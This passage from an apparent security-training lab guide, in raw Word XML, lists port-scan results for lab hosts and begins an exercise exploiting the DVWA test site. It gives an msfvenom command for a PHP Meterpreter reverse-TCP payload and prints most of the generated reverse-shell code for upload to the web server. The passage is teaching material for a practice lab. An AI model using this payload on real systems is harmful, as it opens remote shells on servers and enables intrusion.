      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00526315">
        <w:t>tcp</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00526315">
        <w:t xml:space="preserve">    http-proxy     open   F5 BIG-IP load balancer http proxy</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="206155B6" w14:textId="77777777" w:rsidR="002550AF" w:rsidRPr="00526315" w:rsidRDefault="002550AF" w:rsidP="00526315">
      <w:pPr>
        <w:pStyle w:val="TableGraphsource"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00526315">
        <w:t>10.1.10.102  443</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00526315">
        <w:t xml:space="preserve">    </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00526315">
        <w:t>tcp</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00526315">
        <w:t xml:space="preserve">    </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00526315">
        <w:t>ssl</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00526315">
        <w:t>/https      open</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5121F5B7" w14:textId="77777777" w:rsidR="002550AF" w:rsidRPr="00526315" w:rsidRDefault="002550AF" w:rsidP="00526315">
      <w:pPr>
        <w:pStyle w:val="TableGraphsource"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00526315">
        <w:t>10.1.10.115  80</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00526315">
        <w:t xml:space="preserve">     </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00526315">
        <w:t>tcp</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00526315">
        <w:t xml:space="preserve">    http-proxy     open   F5 BIG-IP load balancer http proxy</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1EDC5C14" w14:textId="77777777" w:rsidR="002550AF" w:rsidRPr="00526315" w:rsidRDefault="002550AF" w:rsidP="00526315">
      <w:pPr>
        <w:pStyle w:val="TableGraphsource"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00526315">
        <w:t>10.1.10.115  443</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00526315">
        <w:t xml:space="preserve">    </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00526315">
        <w:t>tcp</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00526315">
        <w:t xml:space="preserve">    </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00526315">
        <w:t>ssl</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00526315">
        <w:t>/https      open</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="06C522A4" w14:textId="77777777" w:rsidR="002550AF" w:rsidRPr="00526315" w:rsidRDefault="002550AF" w:rsidP="00526315">
      <w:pPr>
        <w:pStyle w:val="TableGraphsource"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00526315">
        <w:t>10.1.10.120  80</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00526315">
        <w:t xml:space="preserve">     </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00526315">
        <w:t>tcp</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00526315">
        <w:t xml:space="preserve">    http-proxy     open   F5 BIG-IP load balancer http proxy</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="53CEA9F8" w14:textId="77777777" w:rsidR="002550AF" w:rsidRPr="00526315" w:rsidRDefault="002550AF" w:rsidP="00526315">
      <w:pPr>
        <w:pStyle w:val="TableGraphsource"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00526315">
        <w:t>10.1.10.120  443</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00526315">
        <w:t xml:space="preserve">    </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00526315">
        <w:t>tcp</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00526315">
        <w:t xml:space="preserve">    </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00526315">
        <w:t>ssl</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00526315">
        <w:t xml:space="preserve">/http       open   Apache </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00526315">
        <w:t>httpd</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00526315">
        <w:t xml:space="preserve"> 2.4.7 (Ubuntu) PHP/5.5.9-1ubuntu4.21 OpenSSL/1.0.1f</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3A5B785E" w14:textId="77777777" w:rsidR="002550AF" w:rsidRPr="00526315" w:rsidRDefault="002550AF" w:rsidP="00526315">
      <w:pPr>
        <w:pStyle w:val="TableGraphsource"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00526315">
        <w:t>10.1.10.125  443</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00526315">
        <w:t xml:space="preserve">    </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00526315">
        <w:t>tcp</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00526315">
        <w:t xml:space="preserve">    </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00526315">
        <w:t>ssl</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00526315">
        <w:t xml:space="preserve">/http       open   Apache </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00526315">
        <w:t>httpd</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00526315">
        <w:t xml:space="preserve"> 2.4.7 (Ubuntu) PHP/5.5.9-1ubuntu4.21 OpenSSL/1.0.1f</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="62258FDA" w14:textId="77777777" w:rsidR="002550AF" w:rsidRPr="00526315" w:rsidRDefault="002550AF" w:rsidP="00526315">
      <w:pPr>
        <w:pStyle w:val="TableGraphsource"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00526315">
        <w:t>10.1.10.131  80</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00526315">
        <w:t xml:space="preserve">     </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00526315">
        <w:t>tcp</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00526315">
        <w:t xml:space="preserve">    http           open   </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00526315">
        <w:t>nginx</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00526315">
        <w:t xml:space="preserve"> 1.10.0 Ubuntu</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="560C9900" w14:textId="77777777" w:rsidR="002550AF" w:rsidRPr="00526315" w:rsidRDefault="002550AF" w:rsidP="00526315">
      <w:pPr>
        <w:pStyle w:val="TableGraphsource"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00526315">
        <w:t>10.1.10.132  80</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00526315">
        <w:t xml:space="preserve">     </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00526315">
        <w:t>tcp</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00526315">
        <w:t xml:space="preserve">    http           open</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3C568A0A" w14:textId="77777777" w:rsidR="002550AF" w:rsidRPr="00526315" w:rsidRDefault="002550AF" w:rsidP="00526315">
      <w:pPr>
        <w:pStyle w:val="TableGraphsource"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00526315">
        <w:t>10.1.10.195  3389</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00526315">
        <w:t xml:space="preserve">   </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00526315">
        <w:t>tcp</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00526315">
        <w:t xml:space="preserve">    </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00526315">
        <w:t>ms</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00526315">
        <w:t>-</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00526315">
        <w:t>wbt</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00526315">
        <w:t>-server  open   Microsoft Terminal Service</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5EFA70D5" w14:textId="77777777" w:rsidR="002550AF" w:rsidRPr="00526315" w:rsidRDefault="002550AF" w:rsidP="00526315">
      <w:pPr>
        <w:pStyle w:val="TableGraphsource"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00526315">
        <w:t>10.1.10.240  22</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00526315">
        <w:t xml:space="preserve">     </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00526315">
        <w:t>tcp</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00526315">
        <w:t xml:space="preserve">    ssh            open   OpenSSH 6.7p1 Debian 5 protocol 2.0</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7D2B32BD" w14:textId="265A22C9" w:rsidR="00382CF3" w:rsidRDefault="002550AF" w:rsidP="00420693">
      <w:pPr>
        <w:pStyle w:val="TableGraphsource"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00420693">
        <w:t>10.1.10.240  111</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00420693">
        <w:t xml:space="preserve">    </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00420693">
        <w:t>tcp</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00420693">
        <w:t xml:space="preserve">    </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00420693">
        <w:t>rpcbind</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00420693">
        <w:t xml:space="preserve">        open   2-4 RPC #100000</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6AF5504F" w14:textId="77777777" w:rsidR="00382CF3" w:rsidRPr="00420693" w:rsidRDefault="00382CF3" w:rsidP="00420693">
      <w:pPr>
        <w:pStyle w:val="Bodycopy"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6419D82F" w14:textId="0E055219" w:rsidR="003B20F4" w:rsidRDefault="009A41D5" w:rsidP="009A41D5">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:bookmarkStart w:id="11" w:name="_Toc487296566"/>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">Exercise </w:t>
      </w:r>
      <w:r w:rsidR="00D75B04">
        <w:t>2</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: </w:t>
      </w:r>
      <w:r w:rsidR="009E6545">
        <w:t>Exploiting</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> a </w:t>
      </w:r>
      <w:r w:rsidR="009E6545">
        <w:t>Web Server</w:t>
      </w:r>
      <w:bookmarkEnd w:id="11"/>
    </w:p>
    <w:p w14:paraId="56B557A6" w14:textId="03C43FE6" w:rsidR="00756588" w:rsidRDefault="00756588" w:rsidP="003A1ACF">
      <w:pPr>
        <w:pStyle w:val="Bodycopy"/>
      </w:pPr>
      <w:r>
        <w:t>This exploit uses some of the basic functions of the DVWA web site to demonstrate how to hack through the site itself.  A hacker would use this</w:t>
      </w:r>
      <w:r w:rsidR="007C4578">
        <w:t xml:space="preserve"> as a means of circumventing your perimeter to gain access to your applications, servers and data.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1AD40079" w14:textId="0B2DB787" w:rsidR="007C4578" w:rsidRDefault="007C4578" w:rsidP="003A1ACF">
      <w:pPr>
        <w:pStyle w:val="Bodycopy"/>
      </w:pPr>
      <w:r>
        <w:t>We will start by creating a pre-ca</w:t>
      </w:r>
      <w:r w:rsidR="00547D35">
        <w:t>nned piece of php code that we will upload to the web server through the upload function on DVWA.</w:t>
      </w:r>
      <w:r w:rsidR="00240F5A">
        <w:t xml:space="preserve">  For this exercise you will need to locate the external IP for your Kali server.  This IP is generated dynamically for each </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidR="00240F5A">
        <w:t>student</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidR="00240F5A">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00FB4F2F">
        <w:t xml:space="preserve">but we have written a script and an </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00FB4F2F">
        <w:t>iRule</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00FB4F2F">
        <w:t xml:space="preserve"> on the CTF server to return the IP address you’ll need.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6E130F5B" w14:textId="3691392A" w:rsidR="00547D35" w:rsidRDefault="00547D35" w:rsidP="003A1ACF">
      <w:pPr>
        <w:pStyle w:val="Bodycopy"/>
      </w:pPr>
      <w:r>
        <w:t>On the Kali server, run the following:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="072515E5" w14:textId="2D0213F8" w:rsidR="00547D35" w:rsidRDefault="00547D35" w:rsidP="00526315">
      <w:pPr>
        <w:pStyle w:val="TableGraphsource"/>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>msfvenom</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> -p php/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>meterpreter</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>reverse_tcp</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>lport</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>=4444 -f raw</w:t>
      </w:r>
      <w:r w:rsidR="00FB4F2F">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00FB4F2F">
        <w:t>lhost</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00FB4F2F">
        <w:t xml:space="preserve">=`curl -k </w:t>
      </w:r>
      <w:r w:rsidR="00FE191E" w:rsidRPr="00420693">
        <w:t>https://ctf.f5lab.biz/whatismyip`</w:t>
      </w:r>
      <w:r w:rsidR="00FB4F2F">
        <w:t xml:space="preserve">  </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="350452FA" w14:textId="77777777" w:rsidR="00FB4F2F" w:rsidRDefault="00FB4F2F" w:rsidP="00526315">
      <w:pPr>
        <w:pStyle w:val="TableGraphsource"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>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01F01CC3" w14:textId="77777777" w:rsidR="00FB4F2F" w:rsidRDefault="00FB4F2F" w:rsidP="00526315">
      <w:pPr>
        <w:pStyle w:val="TableGraphsource"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">                                 </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t>Dload</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve">  Upload</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:t xml:space="preserve">   Total   Spent    Left  Speed</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="738C1371" w14:textId="77777777" w:rsidR="00FB4F2F" w:rsidRDefault="00FB4F2F" w:rsidP="00526315">
      <w:pPr>
        <w:pStyle w:val="TableGraphsource"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">100    </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t>14  100</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:t xml:space="preserve">    14    0     0    492      0 --:--:-- --:--:-- --:--:--   518</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5FD2D581" w14:textId="77777777" w:rsidR="00FB4F2F" w:rsidRDefault="00FB4F2F" w:rsidP="00526315">
      <w:pPr>
        <w:pStyle w:val="TableGraphsource"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">No platform was selected, choosing </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t>Msf</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>::</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:t>Module::Platform::PHP from the payload</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3655A595" w14:textId="77777777" w:rsidR="00FB4F2F" w:rsidRDefault="00FB4F2F" w:rsidP="00526315">
      <w:pPr>
        <w:pStyle w:val="TableGraphsource"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:t>No Arch selected, selecting Arch: php from the payload</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0EBE184D" w14:textId="77777777" w:rsidR="00FB4F2F" w:rsidRDefault="00FB4F2F" w:rsidP="00526315">
      <w:pPr>
        <w:pStyle w:val="TableGraphsource"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">No encoder or </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>badchars</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> specified, outputting raw payload</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2DB70D47" w14:textId="77777777" w:rsidR="00FB4F2F" w:rsidRDefault="00FB4F2F" w:rsidP="00526315">
      <w:pPr>
        <w:pStyle w:val="TableGraphsource"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:t>Payload size: 950 bytes</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="230B73E0" w14:textId="0A4427BB" w:rsidR="00FB4F2F" w:rsidRDefault="00FB4F2F" w:rsidP="00526315">
      <w:pPr>
        <w:pStyle w:val="TableGraphsource"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">/*&lt;?php /**/ </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>error_reporting</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>(0); $</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>ip</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> = '&lt;YOUR-IP&gt;'; $port = 4444; if (($f = '</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>stream_socket_client</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve">') &amp;&amp; </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>is_callable</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>($f)) { $s = $f("</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>tcp</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>://{$</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>ip</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>}:{$port}"); $</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>s_type</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> = 'stream'; } elseif (($f = '</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>fsockopen</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve">') &amp;&amp; </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>is_callable</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>($f)) { $s = $f($</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>ip</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>, $port); $</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>s_type</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> = 'stream'; } elseif (($f = '</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>socket_create</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve">') &amp;&amp; </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>is_callable</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>($f)) { $s = $f(AF_INET, SOCK_STREAM, SOL_TCP); $res = @</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>socket_connect</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>($s, $</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>ip</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>, $port); if (!$res) { die(); } $</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>s_type</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> = 'socket'; } else { die('no socket </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>funcs</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>'); } if (!$s) { die('no socket'); } switch ($</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>s_type</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>) { case 'stream': $</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>len</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> = </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>fread</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>($s, 4); break; case 'socket': $</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>len</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> = </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>socket_read</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>($s, 4); break; } if (!$</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>len</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>) { die(); } $a = unpack("</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>Nlen</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>", $</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>len</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>); $</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>len</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> = $a['</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>len</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>']; $b = ''; while (</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>strlen</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>($b) &lt; $</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>len</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>) { switch ($</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>s_type</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve">) { case 'stream': $b .= </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>fread</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>($s, $</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>len-strlen</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve">($b)); break; case 'socket': $b .= </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>socket_read</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>($s, $</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>len-strlen</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>($b)); break; } } $GLOBALS['</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>msgsock</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>'] = $s; $GLOBALS['</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>msgsock_type</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>'] = $</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>s_type</w:t>
      </w:r>
